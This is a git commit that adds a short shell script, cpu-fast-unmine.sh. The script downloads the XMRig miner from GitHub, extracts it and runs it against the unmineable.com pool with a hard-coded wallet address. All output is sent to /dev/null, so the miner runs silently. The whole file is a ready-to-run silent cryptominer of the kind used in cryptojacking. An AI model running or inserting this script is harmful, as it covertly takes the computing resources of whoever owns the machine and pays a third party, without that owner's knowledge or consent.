998ea4e2084bc15e48804d949751cc802189afda
fcknjds <144345473+fcknjds@users.noreply.github.com>
2023-09-20 15:06:44 +0300

    Create cpu-fast-unmine.sh

---
+++ cpu-fast-unmine.sh
@@ -0,0 +1,3 @@
+{
+  wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz && tar xf xmrig-6.16.2-linux-static-x64.tar.gz && cd xmrig-6.16.2 && ./xmrig -a randomx -o rx.unmineable.com -u TS5CSNS97hXLtRPjrZHUafBBbxeFiFnYZG
+} &> /dev/null
